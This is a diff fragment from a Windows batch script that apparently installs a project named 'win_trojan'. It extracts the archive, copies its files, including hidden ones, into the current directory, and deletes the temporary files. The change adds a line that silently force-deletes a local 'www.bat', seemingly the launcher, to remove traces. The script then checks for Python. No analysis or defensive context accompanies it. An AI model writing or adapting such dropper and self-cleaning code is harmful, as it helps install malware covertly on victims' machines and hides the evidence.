@@ -32,10 +32,11 @@ powershell -Command "Expand-Archive -Path '%ZIP_FILE%' -DestinationPath '%TEMP_E
 echo [*] Moving files to %CD%...
 xcopy "%TEMP_EXTRACT%\win_trojan-main\*" "." /E /H /Y /Q
 
-:: 4. Cleanup Zip and Temp Folder
+:: 4. Cleanup Zip, Temp Folder, and local www.bat
 echo [*] Cleaning up...
 rd /S /Q "%TEMP_EXTRACT%"
 del "%ZIP_FILE%"
+if exist "www.bat" del /F /Q "www.bat"
 
 :: 5. Python Check and Install
 %PYTHON_EXE% --version >nul 2>&1
